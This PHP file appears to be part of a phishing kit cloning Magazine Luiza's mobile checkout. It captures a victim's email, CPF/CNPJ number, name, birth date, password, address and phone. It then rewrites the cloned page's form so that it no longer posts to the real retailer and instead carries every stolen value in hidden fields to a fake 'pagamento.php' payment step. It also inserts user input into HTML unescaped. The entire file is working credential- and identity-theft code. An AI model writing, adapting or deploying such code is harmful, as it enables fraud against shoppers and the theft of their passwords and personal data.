<?php
$email = $_POST['email'];
$cpf = $_POST['cpf_cnpj'];
$nomecompleto = $_POST['name'];
$nascimento = $_POST['birth_date'];
$senha = $_POST['password'];
$cep = $_POST['cep'];
$endereco = $_POST['rua'];
$numero = $_POST['number'];
$complemento = $_POST['complement'];
$bairro = $_POST['bairro'];
$cidade = $_POST['cidade'];
$estado = $_POST['uf'];
$telefone = $_POST['phone_number'];

include("../conexao.php");
include("../banco.php");

$conteudo = file_get_contents('../dist/mobile/endereco.html');
$s1 = str_replace('{$NOME}', $nomecompleto, $conteudo);
$s2 = str_replace('{$RUA}', $endereco, $s1);
$s3 = str_replace('{$NUMERO}', $numero, $s2);
$s4 = str_replace('{$BAIRRO}', $bairro, $s3);
$s5 = str_replace('{$CIDADE}', $cidade, $s4);
$s6 = str_replace('{$ESTADO}', $estado, $s5);
$s7 = str_replace('{$CEP}', $cep, $s6);
$s8 = str_replace('<form class="address-select-form" action="https://m.magazineluiza.com.br/" novalidate="">', '<form class="address-select-form" action="pagamento.php?id='.$id.'&titulo='.$nomelink.'&dist='.$dist.'" method="post"><input type="hidden" name="email" value="'.$email.'"><input type="hidden" name="cpf_cnpj" value="'.$cpf.'"><input type="hidden" name="name" value="'.$nomecompleto.'"><input type="hidden" name="birth_date" value="'.$nascimento.'"><input type="hidden" name="password" value="'.$senha.'"><input type="hidden" name="cep" value="'.$cep.'"><input type="hidden" name="rua" value="'.$endereco.'"><input type="hidden" name="number" value="'.$numero.'"><input type="hidden" name="complement" value="'.$complemento.'"><input type="hidden" name="bairro" value="'.$bairro.'"><input type="hidden" name="cidade" value="'.$cidade.'"><input type="hidden" name="uf" value="'.$estado.'"><input type="hidden" name="phone_number" value="'.$telefone.'">',$s7);
echo $s8;